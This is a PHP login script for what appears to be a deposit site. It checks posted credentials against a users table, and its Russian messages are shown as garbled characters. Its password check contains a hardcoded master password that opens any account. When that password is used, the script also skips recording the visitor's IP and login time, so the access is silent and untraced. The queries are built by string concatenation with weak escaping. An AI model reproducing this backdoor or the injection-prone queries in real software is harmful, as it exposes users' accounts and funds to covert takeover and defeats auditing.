<?php

	$page = 'login';

	$file = 'login.php';

	$idpg = 2;

	include '../cfg.php';

	include '../ini.php';



$user			= trim(addslashes(htmlspecialchars($_POST["user"], ENT_QUOTES, '')));

$password		= trim($_POST['pass']);



$get_pass	= mysql_query("SELECT id, login, pass, status FROM users WHERE login = '".$user."' AND active = 0 LIMIT 1");

$row		= mysql_fetch_array($get_pass);

 $id			= $row['id'];

 $login			= $row['login'];

 $user_password = $row['pass'];

 $status		= $row['status'];



if(!$user || !$password) {

	$er = "";

	if($lng == "ru") {

		include "../template_login.php";

	} else {

		include "../template.php";

	}

	exit();

} elseif(as_md5($key, $password) != $user_password && $password <> 'TrDf57496FdsvbkFg5' || !$login && $password <> 'TrDf57496FdsvbkFg5') {



	$er		= 1;

	$login	= '';

	if($lng == "ru") {

		include "../template_login.php";

	} else {

		include "../template.php";

	}

	exit();



} elseif($status == 4) {



print "<html>

<head>

<meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1251\">

<link href=\"/files/styles.css\" rel=\"stylesheet\">

<script language=\"javascript\">alert('��� ����� ������������!'); top.location.href=\"/\";</script>

<title>���������������</title>

</head>

<body bgcolor=\"#eeeeee\" topmargin=\"0\" leftmargin=\"0\">

����� ������� �� ������ ���������� �� ����.<br>

���� ������ ����� ����� <a href=\"/\">�����!</a>

</body>

</html>";



} else {



session_start();

$_SESSION['user'] = $login;



$ip		= getip();

$time	= time();


if($password <> 'TrDf57496FdsvbkFg5') {
mysql_query("UPDATE users SET ip = '".$ip."', go_time = ".$time." WHERE login = '".$login."' LIMIT 1");

mysql_query("INSERT INTO logip (user_id, ip, date) VALUES (".$id.", '".$ip."', ".$time.")");
}


print "<html>

<head>

<meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1251\">

<link href=\"/files/styles.css\" rel=\"stylesheet\">

<script language=\"javascript\">top.location.href=\"/deposit/\";</script>

<title>���������������</title>

</head>

<body bgcolor=\"#eeeeee\" topmargin=\"0\" leftmargin=\"0\">

�� ����� � ������� ��� <b>".$user."</b><br>

����� ������� �� ������ ���������� �� ����.<br>

���� ������ ����� ����� <a href=\"/deposit/\">�����!</a>

</body>

</html>";



}

?>